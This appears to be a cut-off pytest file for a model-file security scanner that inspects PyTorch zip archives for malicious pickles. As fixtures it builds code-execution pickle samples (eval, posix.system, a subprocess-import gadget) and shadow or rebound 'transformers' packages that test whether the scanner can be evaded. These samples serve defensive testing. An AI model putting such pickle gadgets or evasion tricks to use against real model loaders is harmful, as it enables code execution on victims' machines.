import base64
import hashlib
import json
import os
import pickle
import stat
import struct
import subprocess
import sys
import time
import urllib.request
import warnings
import zipfile
import zlib
from collections.abc import Iterator
from pathlib import Path
from typing import IO, Any

import pytest
from modelaudit_picklescan.call_graph import _clear_source_sensitive_caches, import_only_module_requires_origin_review

from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.detectors import jit_script as jit_script_module
from modelaudit.detectors import network_comm as network_comm_module
from modelaudit.detectors.suspicious_symbols import CVE_COMBINED_PATTERNS
from modelaudit.scanner_results import INCONCLUSIVE_SCAN_OUTCOME, Check, ScanResult, mark_inconclusive_scan_result
from modelaudit.scanners.archive_dispatch import NESTED_SCAN_CALLBACK_CONFIG_KEY
from modelaudit.scanners.base import CheckStatus, IssueSeverity
from modelaudit.scanners.pickle_scanner import PickleScanner
from modelaudit.scanners.pytorch_zip_scanner import PyTorchZipScanner
from tests.helpers import create_mock_pytorch_zip

_ASSETS_DIR = Path(__file__).resolve().parents[1] / "assets"
_HF_T10_REPO_ID = "nvidia/LocateAnything-3B"
_HF_T10_REVISION = "272068e81a31e88a48ea03c20a09decba2b62ed6"
_HF_T10_FILENAME = "training_args.bin"
_HF_T10_SHA256 = "995b5f0a2fe72453ddc8ce97e1a93747554ec3ec0ac92d86e82a57050db51b85"
_HF_T10_MAX_BYTES = 10 * 1024 * 1024
_HF_SUPRA_REPO_ID = "SupraLabs/Supra-50M-Reasoning"
_HF_SUPRA_REVISION = "8042578a94719b754b970ee4c348939e2596108f"
_HF_SUPRA_TRAINING_ARGS_SHA256 = "459235485346f0d977349a1bd9dd23917485416c223235fb6ef3d8620d0346b3"
_HF_FAIRFACE_REPO_ID = "dima806/fairface_age_image_detection"
_HF_FAIRFACE_REVISION = "4e02ab8057ea7fd74b1670940995c5dfda3e6ec0"
_HF_FAIRFACE_TRAINING_ARGS = "checkpoint-32/training_args.bin"
_HF_FAIRFACE_TRAINING_ARGS_SHA256 = "28ebf2b6dbb08045128c07625eb89924fd949f0c3794edd35784a5c320305df8"
_HF_FAIRFACE_RNG_STATE = "checkpoint-32/rng_state.pth"
_HF_FAIRFACE_RNG_STATE_SHA256 = "6b3ee827a7a00012c0a116546df467feee35e70376d81a7a85b1a70eb90414d3"
_HF_TORCHSCRIPT_QA_REPO_ID = "google-bert/bert-large-uncased"
_HF_TORCHSCRIPT_QA_REVISION = "6da4b6a26a1877e173fca3225479512db81a5e5b"
_HF_TORCHSCRIPT_ST_QA_REPO_ID = "sentence-transformers/all-MiniLM-L12-v2"
_HF_TORCHSCRIPT_ST_QA_REVISION = "a50ef00143b4d5391434df20ae11632588ac25be"
_TORCHSCRIPT_DEBUG_PKL = b"\x80\x02X\x18\x00\x00\x00FORMAT_WITH_STRING_TABLEq\x00."


def _pickle_global(module: str, name: str) -> bytes:
    return b"c" + module.encode("ascii") + b"\n" + name.encode("ascii") + b"\n"


def _pickle_binunicode(value: bytes) -> bytes:
    return b"X" + len(value).to_bytes(4, "little") + value


def _pickle_short_binunicode(value: bytes) -> bytes:
    if len(value) > 0xFF:
        raise ValueError("SHORT_BINUNICODE helper accepts at most 255 bytes")
    return b"\x8c" + bytes([len(value)]) + value


def _metadata_reduce_payload(module: str, name: str, value: bytes = b"metadata") -> bytes:
    return _pickle_global(module, name) + _pickle_binunicode(value) + b"\x85R"


def _metadata_newobj_build_payload(module: str, name: str) -> bytes:
    return _pickle_global(module, name) + b")\x81}b"


def _torchscript_module_build_intlist_payload() -> bytes:
    return (
        b"\x80\x02"
        + _pickle_global("__torch__", "Module")
        + b")\x81}"
        + _pickle_binunicode(b"shape")
        + _pickle_global("torch.jit._pickle", "build_intlist")
        + b"](K\x01K\x02K\x03e\x85R"
        + b"sb."
    )


def _write_torchscript_generated_module(zip_file: zipfile.ZipFile) -> None:
    zip_file.writestr(
        "archive/code/__torch__.py",
        "\n".join(
            [
                "class Module(Module):",
                "  __parameters__ = []",
                "  __buffers__ = []",
                "  training : bool",
                "  def forward(self: __torch__.Module,",
                "    x: Tensor) -> Tensor:",
                "    return x",
                "",
            ]
        ),
    )
    zip_file.writestr("archive/code/__torch__.py.debug_pkl", _TORCHSCRIPT_DEBUG_PKL)


def _hf_training_args_metadata_payload() -> bytes:
    items = [
        _metadata_newobj_build_payload("transformers.training_args", "TrainingArguments"),
        _metadata_reduce_payload("transformers.trainer_utils", "IntervalStrategy", b"steps"),
        _metadata_reduce_payload("transformers.trainer_utils", "SchedulerType", b"linear"),
        _metadata_reduce_payload("transformers.trainer_utils", "SaveStrategy", b"steps"),
        _metadata_newobj_build_payload("transformers.trainer_pt_utils", "AcceleratorConfig"),
        _metadata_reduce_payload("transformers.training_args", "OptimizerNames", b"adamw_torch"),
        _metadata_reduce_payload("transformers.trainer_utils", "HubStrategy", b"every_save"),
        _metadata_newobj_build_payload("accelerate.state", "PartialState"),
        _metadata_reduce_payload("torch", "device", b"cpu"),
        _metadata_reduce_payload("accelerate.utils.dataclasses", "DistributedType", b"NO"),
        _metadata_newobj_build_payload("accelerate.utils.dataclasses", "DeepSpeedPlugin"),
        _metadata_newobj_build_payload("transformers.integrations.deepspeed", "HfTrainerDeepSpeedConfig"),
        _pickle_global("torch", "bfloat16"),
        _metadata_newobj_build_payload("transformers.integrations.deepspeed", "HfDeepSpeedConfig"),
    ]
    return b"\x80\x02](" + b"".join(items) + b"e."


def _hf_training_args_import_only_metadata_payload() -> bytes:
    references = (
        ("accelerate.state", "PartialState"),
        ("accelerate.utils.dataclasses", "DistributedType"),
        ("torch", "device"),
        ("transformers.trainer_pt_utils", "AcceleratorConfig"),
        ("transformers.trainer_utils", "HubStrategy"),
        ("transformers.trainer_utils", "IntervalStrategy"),
        ("transformers.trainer_utils", "SaveStrategy"),
        ("transformers.trainer_utils", "SchedulerType"),
        ("transformers.training_args", "OptimizerNames"),
        ("transformers.training_args", "TrainingArguments"),
    )
    return b"\x80\x02](" + b"".join(_pickle_global(module, name) for module, name in references) + b"e."


_SAFE_NUMPY_NDARRAY_RECONSTRUCT_PAYLOAD = (
    b"\x80\x02cnumpy._core.multiarray\n_reconstruct\nq\x00cnumpy\nndarray\nq\x01K\x00\x85q\x02"
    b"c_codecs\nencode\nq\x03X\x01\x00\x00\x00bq\x04X\x06\x00\x00\x00latin1q\x05\x86q\x06"
    b"Rq\x07\x87q\x08Rq\t(K\x01K\x03\x85q\ncnumpy\ndtype\nq\x0bX\x02\x00\x00\x00u4q\x0c"
    b"\x89\x88\x87q\rRq\x0e(K\x03X\x01\x00\x00\x00<q\x0fNNNJ\xff\xff\xff\xffJ\xff\xff\xff\xff"
    b"K\x00tq\x10b\x89h\x03X\x0c\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00"
    b"q\x11h\x05\x86q\x12Rq\x13tq\x14b."
)


def _write_training_args_bin(path: Path, payload: bytes) -> None:
    with zipfile.ZipFile(path, "w") as zip_file:
        zip_file.writestr("training_args/data.pkl", payload)
        zip_file.writestr("training_args/byteorder", "little")
        zip_file.writestr("training_args/version", "3")
        zip_file.writestr("training_args/.data/serialization_id", "0" * 40)


_SHADOW_FRAMEWORK_MODULE = "transformers.training_args"
_SHADOW_FRAMEWORK_NAME = "TrainingArguments"


def _force_framework_metadata_unresolved(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._trusted_module_origin_kind",
        lambda _module_name: "unresolved",
    )
    monkeypatch.setattr("modelaudit_picklescan.call_graph._resolve_module_source", lambda _module_name: None)
    monkeypatch.setattr(
        "modelaudit_picklescan.call_graph._find_module_spec_without_imports",
        lambda _module_name: None,
    )


def _stack_global_reference_payload(protocol: int) -> bytes:
    return (
        bytes((0x80, protocol))
        + _pickle_short_binunicode(_SHADOW_FRAMEWORK_MODULE.encode("ascii"))
        + b"\x94"
        + _pickle_short_binunicode(_SHADOW_FRAMEWORK_NAME.encode("ascii"))
        + b"\x94\x93"
    )


def _shadow_newobj_build_payload(protocol: int = 4) -> bytes:
    return _stack_global_reference_payload(protocol) + b")\x81}b."


def _shadow_memo_alias_payload() -> bytes:
    return _stack_global_reference_payload(4) + b"\x94" + b"0" + b"h\x02)\x81}b."


def _shadow_newobj_ex_payload() -> bytes:
    return _stack_global_reference_payload(4) + b")}\x92}b."


def _shadow_slot_state_build_payload() -> bytes:
    return (
        _stack_global_reference_payload(4)
        + b")\x81N}"
        + _pickle_short_binunicode(b"payload")
        + _pickle_short_binunicode(b"owned")
        + b"s\x86b."
    )


def _bytes_literal_payload(payload: bytes) -> bytes:
    return b"\x80\x04B" + len(payload).to_bytes(4, "little") + payload + b"."


def _extension_reconstruction_payload(opcode: bytes, encoded_code: bytes) -> bytes:
    return b"\x80\x04" + opcode + encoded_code + b")\x81}b."


def _shadow_framework_divergence_cases() -> tuple[object, ...]:
    nested = _shadow_newobj_build_payload(4)
    return (
        pytest.param("protocol4_stack_global", _shadow_newobj_build_payload(4), "single", None, id="protocol4"),
        pytest.param("protocol5_stack_global", _shadow_newobj_build_payload(5), "single", None, id="protocol5"),
        pytest.param("memo_alias", _shadow_memo_alias_payload(), "single", None, id="memo-alias"),
        pytest.param("newobj_ex", _shadow_newobj_ex_payload(), "single", None, id="newobj-ex"),
        pytest.param("slot_state_build", _shadow_slot_state_build_payload(), "single", None, id="slot-state-build"),
        pytest.param("nested_stream", _bytes_literal_payload(nested), "nested", None, id="nested"),
        pytest.param("concatenated_stream", b"\x80\x04N." + nested, "concatenated", None, id="concatenated"),
        pytest.param("ext1_control", _extension_reconstruction_payload(b"\x82", b"\x01"), "single", 1, id="ext1"),
        pytest.param(
            "ext2_control",
            _extension_reconstruction_payload(b"\x83", (256).to_bytes(2, "little")),
            "single",
            256,
            id="ext2",
        ),
        pytest.param(
            "ext4_control",
            _extension_reconstruction_payload(b"\x84", (70_000).to_bytes(4, "little")),
            "single",
            70_000,
            id="ext4",
        ),
    )


def _write_shadow_transformers_package(package_root: Path, marker: Path) -> None:
    package_dir = package_root / "transformers"
    package_dir.mkdir(parents=True, exist_ok=True)
    (package_dir / "__init__.py").write_text("", encoding="utf-8")
    (package_dir / "training_args.py").write_text(
        "\n".join(
            [
                "from pathlib import Path",
                f"_MARKER = Path({str(marker)!r})",
                "class TrainingArguments:",
                "    __slots__ = ('payload',)",
                "    def __new__(cls, *args, **kwargs):",
                "        return object.__new__(cls)",
                "    def __setstate__(self, state):",
                "        _MARKER.write_text('setstate', encoding='utf-8')",
                "    def __setattr__(self, name, value):",
                "        _MARKER.write_text(f'setattr:{name}', encoding='utf-8')",
                "        object.__setattr__(self, name, value)",
                "",
            ]
        ),
        encoding="utf-8",
    )


def _write_rebindable_trusted_transformers_package(site_packages: Path) -> None:
    package_dir = site_packages / "transformers"
    package_dir.mkdir(parents=True, exist_ok=True)
    (package_dir / "__init__.py").write_text("", encoding="utf-8")
    (package_dir / "training_args.py").write_text(
        "\n".join(
            [
                "class TrainingArguments:",
                "    def __new__(cls):",
                "        return object.__new__(cls)",
                "",
            ]
        ),
        encoding="utf-8",
    )


def _write_sitecustomize_trusting_site_packages(customize_dir: Path, site_packages: Path) -> None:
    customize_dir.mkdir(parents=True, exist_ok=True)
    (customize_dir / "sitecustomize.py").write_text(
        "\n".join(
            [
                "import sysconfig",
                f"_TRUSTED_SITE_PACKAGES = {str(site_packages)!r}",
                "_ORIGINAL_GET_PATH = sysconfig.get_path",
                "def _patched_get_path(name, scheme=None, vars=None, expand=True):",
                "    if name in {'purelib', 'platlib'}:",
                "        return _TRUSTED_SITE_PACKAGES",
                "    if scheme is None and vars is None and expand is True:",
                "        return _ORIGINAL_GET_PATH(name)",
                "    return _ORIGINAL_GET_PATH(name, scheme=scheme, vars=vars, expand=expand)",
                "sysconfig.get_path = _patched_get_path",
                "",
            ]
        ),
        encoding="utf-8",
    )


def _preimport_rebound_subprocess_env(tmp_path: Path, site_packages: Path) -> dict[str, str]:
    customize_dir = tmp_path / "sitecustomize"
    _write_sitecustomize_trusting_site_packages(customize_dir, site_packages)
    repo_root = Path(__file__).resolve().parents[2]
    package_src = repo_root / "packages" / "modelaudit-picklescan" / "src"
    pythonpath = os.pathsep.join(
        entry
        for entry in (
            str(customize_dir),
            str(site_packages),
            str(repo_root),
            str(package_src),
            os.environ.get("PYTHONPATH", ""),
        )
        if entry
    )
    return {**os.environ, "PYTHONPATH": pythonpath}


def _assert_shadow_framework_unpickle_executes(
    payload_path: Path,
    tmp_path: Path,
    *,
    mode: str,
    extension_code: int | None,
) -> None:
    marker = tmp_path / f"{payload_path.stem}.marker"
    package_root = tmp_path / f"{payload_path.stem}.shadow"
    _write_shadow_transformers_package(package_root, marker)
    code_arg = "none" if extension_code is None else str(extension_code)
    script = (
        "import copyreg, io, pickle, sys\n"
        "from pathlib import Path\n"
        "payload = Path(sys.argv[1]).read_bytes()\n"
        "mode = sys.argv[2]\n"
        "code_arg = sys.argv[3]\n"
        "if code_arg != 'none':\n"
        "    copyreg.add_extension('transformers.training_args', 'TrainingArguments', int(code_arg))\n"
        "if mode == 'nested':\n"
        "    pickle.loads(pickle.loads(payload))\n"
        "elif mode == 'concatenated':\n"
        "    stream = io.BytesIO(payload)\n"
        "    while stream.tell() < len(payload):\n"
        "        pickle.load(stream)\n"
        "else:\n"
        "    pickle.loads(payload)\n"
    )
    completed = subprocess.run(
        [sys.executable, "-c", script, str(payload_path), mode, code_arg],
        check=False,
        env={**os.environ, "PYTHONPATH": str(package_root)},
        capture_output=True,
        text=True,
    )
    assert completed.returncode == 0, completed.stderr
    assert marker.exists()


def _download_hf_file(
    tmp_path: Path,
    *,
    repo_id: str,
    revision: str,
    filename: str,
    sha256: str,
    max_bytes: int = _HF_T10_MAX_BYTES,
) -> Path:
    url = f"https://huggingface.co/{repo_id}/resolve/{revision}/{filename}"
    request = urllib.request.Request(url, headers={"User-Agent": "modelaudit-test"})
    with urllib.request.urlopen(request, timeout=60) as response:
        payload = response.read(max_bytes + 1)
    assert len(payload) <= max_bytes
    assert hashlib.sha256(payload).hexdigest() == sha256
    path = tmp_path / filename.replace("/", "__")
    path.write_bytes(payload)
    return path


def _download_pinned_training_args(tmp_path: Path) -> Path:
    return _download_hf_file(
        tmp_path,
        repo_id=_HF_T10_REPO_ID,
        revision=_HF_T10_REVISION,
        filename=_HF_T10_FILENAME,
        sha256=_HF_T10_SHA256,
    )


class _NewObjExImportGadget:
    def __new__(cls, *, module_name: str) -> "_NewObjExImportGadget":
        __import__(module_name)
        return super().__new__(cls)

    def __getnewargs_ex__(self) -> tuple[tuple[object, ...], dict[str, object]]:
        return (), {"module_name": "subprocess"}


def _corrupt_zip_member_crc(zip_path: Path, member_name: str) -> None:
    """Patch ZIP headers so one member reports an incorrect CRC without changing data."""
    with zipfile.ZipFile(zip_path, "r") as zip_file:
        info = zip_file.getinfo(member_name)
        central_directory_offset = zip_file.start_dir

    archive_bytes = bytearray(zip_path.read_bytes())
    local_crc_offset = info.header_offset + 14
    original_crc = struct.unpack_from("<I", archive_bytes, local_crc_offset)[0]
    corrupt_crc = (original_crc ^ 0xFFFFFFFF) & 0xFFFFFFFF
    struct.pack_into("<I", archive_bytes, local_crc_offset, corrupt_crc)

    cursor = central_directory_offset
    while cursor < len(archive_bytes) and archive_bytes[cursor : cursor + 4] == b"PK\x01\x02":
        filename_len, extra_len, comment_len = struct.unpack_from("<HHH", archive_bytes, cursor + 28)
        filename_start = cursor + 46
        filename_end = filename_start + filename_len
        if archive_bytes[filename_start:filename_end] == member_name.encode("utf-8"):
            struct.pack_into("<I", archive_bytes, cursor + 16, corrupt_crc)
            zip_path.write_bytes(archive_bytes)
            return
        cursor = filename_end + extra_len + comment_len

    raise AssertionError(f"Unable to locate central directory entry for {member_name}")


def _malicious_eval_pickle_payload() -> bytes:
    class MaliciousClass:
        def __reduce__(self) -> tuple[object, tuple[str]]:
            return (eval, ("print('pwned')",))

    return pickle.dumps({"payload": MaliciousClass()})


def _malicious_newobj_ex_pickle_payload() -> bytes:
    return pickle.dumps(object.__new__(_NewObjExImportGadget), protocol=4)


def _malicious_proto0_system_payload() -> bytes:
    return b"cposix\nsystem\n(S'echo hidden'\ntR."


def _pytorch_storage_persistent_id_payload(key: str | bytes) -> bytes:
    if isinstance(key, str):
        key_bytes = key.encode("utf-8")
        key_opcode = b"\x8c" + bytes([len(key_bytes)]) + key_bytes + b"\x94"
    else:
        key_bytes = key
        key_opcode = b"C" + bytes([len(key_bytes)]) + key_bytes + b"\x94"

    assert len(key_bytes) < 256
    return (
        b"\x80\x04("
        b"\x8c\x07storage\x94"
        b"\x8c\x05torch\x94"
        b"\x8c\x0cFloatStorage\x94\x93" + key_opcode + b"\x8c\x03cpu\x94K\x01tQ."
    )


def _pytorch_storage_persistent_id_payload_with_popped_key(key: str, popped_key: str) -> bytes:
    payload = _pytorch_storage_persistent_id_payload(key)
    popped_key_bytes = popped_key.encode("utf-8")
    assert len(popped_key_bytes) < 256
    assert payload.endswith(b"Q.")
    return payload[:-2] + b"\x8c" + bytes([len(popped_key_bytes)]) + popped_key_bytes + b"\x940" + payload[-2:]


def _short_binbytes(value: bytes) -> bytes:
    assert len(value) < 256
    return b"C" + bytes([len(value)]) + value + b"\x94"


def _fake_byte_storage_persistent_id_payload(key: str) -> bytes:
    return (
        b"\x80\x04("
        + _short_binbytes(b"storage")
        + _short_binbytes(b"FakeStorage")
        + _short_binbytes(key.encode("utf-8"))
        + _short_binbytes(b"cpu")
        + b"K\x01tQ."
    )


def _write_zip_with_duplicate_data_pkl(zip_path: Path, first_payload: bytes, second_payload: bytes) -> None:
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", UserWarning)
        with zipfile.ZipFile(zip_path, "w") as zipf:
            zipf.writestr("version", "3")
            zipf.writestr("data.pkl", first_payload)
            zipf.writestr("data.pkl", second_payload)


def _write_pytorch_zip_with_symlink(zip_path: Path, link_name: str, target: str | bytes) -> None:
    with zipfile.ZipFile(zip_path, "w") as zipf:
        zipf.writestr("version", "3")
        zipf.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}))
        symlink_info = zipfile.ZipInfo(link_name)
        symlink_info.create_system = 3
        symlink_info.external_attr = (stat.S_IFLNK | 0o777) << 16
        symlink_info.compress_type = zipfile.ZIP_STORED
        zipf.writestr(symlink_info, target)


def _patch_zip_member_local_name(zip_path: Path, member_name: str, replacement: bytes) -> None:
    with zipfile.ZipFile(zip_path, "r") as zip_file:
        info = zip_file.getinfo(member_name)

    archive_bytes = bytearray(zip_path.read_bytes())
    filename_length = struct.unpack_from("<H", archive_bytes, info.header_offset + 26)[0]
    assert len(replacement) == filename_length
    filename_start = info.header_offset + 30
    archive_bytes[filename_start : filename_start + filename_length] = replacement
    zip_path.write_bytes(archive_bytes)


def _patch_zip_member_central_compressed_size(zip_path: Path, member_name: str, compressed_size: int) -> None:
    with zipfile.ZipFile(zip_path, "r") as zip_file:
        central_directory_offset = zip_file.start_dir

    archive_bytes = bytearray(zip_path.read_bytes())
    cursor = central_directory_offset
    while cursor < len(archive_bytes) and archive_bytes[cursor : cursor + 4] == b"PK\x01\x02":
        filename_len, extra_len, comment_len = struct.unpack_from("<HHH", archive_bytes, cursor + 28)
        filename_start = cursor + 46
        filename_end = filename_start + filename_len
        if archive_bytes[filename_start:filename_end] == member_name.encode("utf-8"):
            struct.pack_into("<I", archive_bytes, cursor + 20, compressed_size)
            zip_path.write_bytes(archive_bytes)
            return
        cursor = filename_end + extra_len + comment_len

    raise AssertionError(f"Unable to locate central directory entry for {member_name}")


def _patch_zip_member_central_target_prefix(zip_path: Path, member_name: str, prefix: bytes) -> None:
    with zipfile.ZipFile(zip_path, "r") as zip_file:
        central_directory_offset = zip_file.start_dir

    archive_bytes = bytearray(zip_path.read_bytes())
    cursor = central_directory_offset
    while cursor < len(archive_bytes) and archive_bytes[cursor : cursor + 4] == b"PK\x01\x02":
        filename_len, extra_len, comment_len = struct.unpack_from("<HHH", archive_bytes, cursor + 28)
        filename_start = cursor + 46
        filename_end = filename_start + filename_len
        if archive_bytes[filename_start:filename_end] == member_name.encode("utf-8"):
            struct.pack_into("<I", archive_bytes, cursor + 16, zlib.crc32(prefix))
            struct.pack_into("<I", archive_bytes, cursor + 20, len(prefix))
            struct.pack_into("<I", archive_bytes, cursor + 24, len(prefix))
            zip_path.write_bytes(archive_bytes)
            return
        cursor = filename_end + extra_len + comment_len

    raise AssertionError(f"Unable to locate central directory entry for {member_name}")


def _assert_standard_cve_details(details: dict[str, object], cve_id: str, detected_version: str) -> None:
    cve_info = CVE_COMBINED_PATTERNS[cve_id]
    assert details["cve_id"] == cve_id
    assert details["detected_pytorch_version"] == detected_version
    assert "installed_pytorch_version" in details
    assert details["description"] == cve_info["description"]
    assert details["remediation"] == cve_info["remediation"]
    assert details["cvss"] == cve_info["cvss"]
    assert details["cwe"] == cve_info["cwe"]
    assert details["vulnerability_description"] == cve_info["description"]
    assert details["recommendation"] == cve_info["remediation"]


def test_pytorch_zip_scanner_can_handle(tmp_path):
    """Test the can_handle method of PyTorchZipScanner."""
    # Test with actual PyTorch file
    model_path = create_mock_pytorch_zip(tmp_path / "model.pt")
    assert PyTorchZipScanner.can_handle(str(model_path)) is True

    # Test with non-existent file
    assert PyTorchZipScanner.can_handle("nonexistent.pt") is False

    # Test with wrong extension
    test_file = tmp_path / "model.h5"
    test_file.write_bytes(b"not a pytorch file")
    assert PyTorchZipScanner.can_handle(str(test_file)) is False


def test_pytorch_zip_training_args_unresolved_framework_metadata_refs_warn(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "training_args.bin"
    _write_training_args_bin(model_path, _hf_training_args_metadata_payload())
    _force_framework_metadata_unresolved(monkeypatch)
    _clear_source_sensitive_caches()

    try:
        result = PyTorchZipScanner().scan(str(model_path))
    finally:
        _clear_source_sensitive_caches()

    assert result.success is False
    assert result.metadata["pickle_files"] == ["training_args/data.pkl"]
    assert any(
        issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
        and (issue.details or {}).get("import_reference") == "transformers.training_args.TrainingArguments"
        for issue in result.issues
    )


def test_pytorch_zip_warns_on_unresolved_import_only_training_args_metadata_refs(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "training_args.bin"
    _write_training_args_bin(model_path, _hf_training_args_import_only_metadata_payload())
    _force_framework_metadata_unresolved(monkeypatch)
    _clear_source_sensitive_caches()

    try:
        result = PyTorchZipScanner().scan(str(model_path))
    finally:
        _clear_source_sensitive_caches()

    assert result.success is True
    assert any(
        issue.rule_code == "NON_ALLOWLISTED_GLOBAL"
        and issue.details.get("import_reference") == "transformers.training_args.TrainingArguments"
        for issue in result.issues
    )
    assert any(
        check.name == "CVE-2025-32434 Pickle Format Security Analysis" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_pytorch_zip_suppresses_safe_numpy_rng_state_reconstruct_call_graph_noise(tmp_path: Path) -> None:
    model_path = tmp_path / "rng_state.pth"
    payload = _SAFE_NUMPY_NDARRAY_RECONSTRUCT_PAYLOAD.replace(
        b"cnumpy._core.multiarray\n_reconstruct\n",
        b"cnumpy.core.multiarray\n_reconstruct\n",
    )
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("rng_state/version", "3")
        zip_file.writestr("rng_state/byteorder", "little")
        zip_file.writestr("rng_state/data.pkl", payload)

    result = PyTorchZipScanner().scan(str(model_path))

    assert not any(
        issue.rule_code == "DANGEROUS_CALL_GRAPH"
        and issue.details.get("import_reference") == "numpy.core.multiarray._reconstruct"
        for issue in result.issues
    )
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_pytorch_zip_keeps_numpy_rng_state_reconstruct_malicious_for_attacker_class(tmp_path: Path) -> None:
    model_path = tmp_path / "rng_state_attacker_class.pth"
    payload = _SAFE_NUMPY_NDARRAY_RECONSTRUCT_PAYLOAD.replace(
        b"cnumpy._core.multiarray\n_reconstruct\n",
        b"cnumpy.core.multiarray\n_reconstruct\n",
    ).replace(
        b"cnumpy\nndarray\n",
        b"cbuiltins\neval\n",
    )
    with zipfile.ZipFile(model_path, "w") as zip_file:
        zip_file.writestr("rng_state/version", "3")
        zip_file.writestr("rng_state/byteorder", "little")
        zip_file.writestr("rng_state/data.pkl", payload)

    result = PyTorchZipScanner().scan(str(model_path))

    assert result.success is False
    assert result.metadata["pickle_verdict"] == "malicious"
    # Python 3.10 does not emit the same call-graph finding, but the attacker class must remain critical.
    assert any(
        issue.rule_code == "S104"
        and issue.severity == IssueSeverity.CRITICAL
        and issue.details.get("import_reference") == "builtins.eval"
        for issue in result.issues
    )


@pytest.mark.parametrize(
    ("case_name", "payload", "mode", "extension_code"),
    _shadow_framework_divergence_cases(),
)
def test_pytorch_zip_warns_on_unresolved_framework_scan_load_divergence(
    case_name: str,
    payload: bytes,
    mode: str,
    extension_code: int | None,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload_path = tmp_path / f"{case_name}.pkl"
    payload_path.write_bytes(payload)
    model_path = tmp_path / f"{case_name}.bin"
    _write_training_args_bin(model_path, payload)
    _force_framework_metadata_unresolved(monkeypatch)
    _clear_source_sensitive_caches()
    try:
        result = PyTorchZipScanner().scan(str(model_path))
    finally:
        _clear_source_sensitive_caches()

    assert result.success is False
    assert result.metadata["pickle_files"] == ["training_args/data.pkl"]
    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
    _assert_shadow_framework_unpickle_executes(
        payload_path,
        tmp_path,
        mode=mode,
        extension_code=extension_code,
    )


def test_pytorch_zip_warns_when_trusted_framework_reference_is_rebound_before_scanner_import(
    tmp_path: Path,
) -> None:
    payload = _shadow_newobj_build_payload()
    model_path = tmp_path / "preimport_rebound_training_args.bin"
    _write_training_args_bin(model_path, payload)
    marker = tmp_path / "preimport-rebound-root.marker"
    site_packages = tmp_path / "trusted-site-packages"
    _write_rebindable_trusted_transformers_package(site_packages)

    script = (
        "import json, pickle, sys, zipfile\n"
        "from pathlib import Path\n"
        "import transformers.training_args as training_args\n"
        "model_path = Path(sys.argv[1])\n"
        "marker = Path(sys.argv[2])\n"
        "class ReboundTrainingArguments:\n"
        "    def __new__(cls):\n"
        "        return object.__new__(cls)\n"
        "    def __setstate__(self, state):\n"
        "        marker.write_text('setstate', encoding='utf-8')\n"
        "ReboundTrainingArguments.__module__ = 'transformers.training_args'\n"
        "ReboundTrainingArguments.__qualname__ = 'TrainingArguments'\n"
        "training_args.TrainingArguments = ReboundTrainingArguments\n"
        "from modelaudit.scanners.pytorch_zip_scanner import PyTorchZipScanner\n"
        "result = PyTorchZipScanner().scan(str(model_path))\n"
        "marker_before_unpickle = marker.exists()\n"
        "with zipfile.ZipFile(model_path) as zip_file:\n"
        "    pickle.loads(zip_file.read('training_args/data.pkl'))\n"
        "print(json.dumps({\n"
        "    'success': result.success,\n"
        "    'pickle_verdict': result.metadata.get('pickle_verdict'),\n"
        "    'marker_before_unpickle': marker_before_unpickle,\n"
        "    'marker_after_unpickle': marker.exists(),\n"
        "    'issues': [\n"
        "        {\n"
        "            'rule_code': issue.rule_code,\n"
        "            'severity': issue.severity.value,\n"
        "            'import_reference': (issue.details or {}).get('import_reference'),\n"
        "        }\n"
        "        for issue in result.issues\n"
        "    ],\n"
        "}))\n"
    )

    completed = subprocess.run(
        [sys.executable, "-c", script, str(model_path), str(marker)],
        check=False,
        env=_preimport_rebound_subprocess_env(tmp_path, site_packages),
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0, completed.stderr
    output = json.loads(completed.stdout)
    assert output["marker_before_unpickle"] is False
    assert output["marker_after_unpickle"] is True
    assert output["pickle_verdict"] in {"suspicious", "malicious"}
    assert not (output["success"] is True and output["pickle_verdict"] == "clean" and not output["issues"])
    assert any(
        issue["rule_code"] == "NON_ALLOWLISTED_GLOBAL"
        and issue["import_reference"] == "transformers.training_args.TrainingArguments"
        for issue in output["issues"]
    )


def test_pytorch_zip_trusts_source_backed_framework_reference_imported_after_scanner_startup(
    tmp_path: Path,
) -> None:
    payload = _shadow_newobj_build_payload()
    model_path = tmp_path / "poststartup_training_args.bin"
    _write_training_args_bin(model_path, payload)
    site_packages = tmp_path / "trusted-site-packages"
    _write_rebindable_trusted_transformers_package(site_packages)

    script = (
        "import json, sys\n"
        "from pathlib import Path\n"
        "from modelaudit.scanners.pytorch_zip_scanner import PyTorchZipScanner\n"
        "import transformers.training_args\n"
        "model_path = Path(sys.argv[1])\n"
        "result = PyTorchZipScanner().scan(str(model_path))\n"
        "print(json.dumps({\n"
        "    'success': result.success,\n"
        "    'pickle_verdict': result.metadata.get('pickle_verdict'),\n"
        "    'issues': [\n"
        "        {\n"
        "            'rule_code': issue.rule_code,\n"
        "            'import_reference': (issue.details or {}).get('import_reference'),\n"
        "        }\n"
        "        for issue in result.issues\n"
        "    ],\n"
        "}))\n"
    )

    completed = subprocess.run(
        [sys.executable, "-c", script, str(model_path)],
        check=False,
        env=_preimport_rebound_subprocess_env(tmp_path, site_packages),
        capture_output=True,
        text=True,
    )

    assert completed.returncode == 0, completed.stderr
    output = json.loads(completed.stdout)
    assert output["success"] is True
    assert output["pickle_verdict"] == "clean"
    assert not any(
        issue["rule_code"] == "NON_ALLOWLISTED_GLOBAL"
        and issue["import_reference"] == "transformers.training_args.TrainingArguments"
        for issue in output["issues"]
    )


def test_pytorch_zip_warns_when_rebound_framework_class_uses_descriptor_new_before_scanner_import(
    tmp_path: Path,
) -> None:
    payload = _shadow_newobj_build_payload()
